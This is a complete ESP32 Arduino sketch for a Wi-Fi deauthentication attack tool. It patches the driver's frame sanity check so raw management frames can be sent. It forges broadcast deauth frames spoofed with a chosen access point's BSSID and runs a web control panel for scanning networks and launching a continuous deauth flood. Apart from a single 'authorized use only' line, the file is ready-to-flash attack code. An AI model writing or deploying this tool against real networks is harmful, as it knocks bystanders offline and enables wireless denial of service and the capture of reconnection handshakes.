#include <WiFi.h>
#include <WebServer.h>
extern "C" {
  #include "esp_wifi.h"
  // Override the driver's raw-frame filter so management frames (deauth/disassoc)
  // are allowed through esp_wifi_80211_tx(). Returning 0 = "frame is valid".
  int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
  }
}

// --- Control panel AP settings ---
const char* controlSSID = "ESP32-Deauth-Control";
const char* controlPass = "calebRox123"; // WPA2 min 8 chars

WebServer server(80);

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

bool attacking = false;
uint8_t targetBSSID[6];
int targetChannel = 1;

void sendDeauth(const uint8_t* bssid, int count = 5) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  memcpy(&deauthFrame[4], broadcast, 6);
  memcpy(&deauthFrame[10], bssid, 6);
  memcpy(&deauthFrame[16], bssid, 6);
  for (int i = 0; i < count; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    delay(20);
  }
}

String macToStr(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
  return String(buf);
}

void handleRoot() {
  String html = R"HTML(
<!DOCTYPE html><html><head><title>ESP32 WiFi Test Tool</title>
<style>
body{font-family:sans-serif;max-width:500px;margin:20px auto;padding:0 10px}
button{padding:10px 16px;margin:4px 0;width:100%;font-size:16px}
.net{border:1px solid #2a07f0;padding:8px;margin:6px 0;border-radius:6px;cursor:pointer}
.net:hover{background:#f0f0f0}
#status{padding:10px;background:#eee;border-radius:6px;margin:10px 0}
</style></head><body>
<h2>ESP32 WiFi Test Tool</h2>
<p style="color:red"><b>Only use on networks you own/are authorized to test.</b></p>
<button onclick="scanNetworks()">Scan Networks</button>
<div id="networks"></div>
<div id="status">No target selected</div>
<button onclick="startAttack()" style="background:#e55">Start Deauth</button>
<button onclick="stopAttack()">Stop</button>
<script>
let selected = null;
function scanNetworks(){
  document.getElementById('networks').innerHTML = 'Scanning...';
  fetch('/scan').then(r=>r.json()).then(data=>{
    let html = '';
    data.forEach(n=>{
      html += `<div class="net" onclick='select("${n.bssid}",${n.channel},"${n.ssid}")'>
        ${n.ssid} — ch${n.channel} — ${n.bssid} (${n.rssi}dBm)</div>`;
    });
    document.getElementById('networks').innerHTML = html;
  });
}
function select(bssid, channel, ssid){
  selected = {bssid, channel, ssid};
  document.getElementById('status').innerText = `Target: ${ssid} (${bssid}) ch${channel}`;
}
function startAttack(){
  if(!selected){ alert('Select a network first'); return; }
  fetch(`/attack?bssid=${selected.bssid}&channel=${selected.channel}`)
    .then(()=>document.getElementById('status').innerText = 'Attacking: '+selected.ssid);
}
function stopAttack(){
  fetch('/stop').then(()=>document.getElementById('status').innerText = 'Stopped');
}
</script></body></html>
)HTML";
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + macToStr(WiFi.BSSID(i)) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleAttack() {
  String bssidStr = server.arg("bssid");
  targetChannel = server.arg("channel").toInt();

  int vals[6];
  sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &vals[0],&vals[1],&vals[2],&vals[3],&vals[4],&vals[5]);
  for (int i = 0; i < 6; i++) targetBSSID[i] = (uint8_t)vals[i];

  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  attacking = true;
  server.send(200, "text/plain", "started");
}

void handleStop() {
  attacking = false;
  server.send(200, "text/plain", "stopped");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(controlSSID, controlPass);
  Serial.print("Control panel at: http://");
  Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  server.begin();
}

void loop() {
  server.handleClient();
  esp_wifi_set_promiscuous(true);
  if (attacking) {
    sendDeauth(targetBSSID, 3);
  }
}
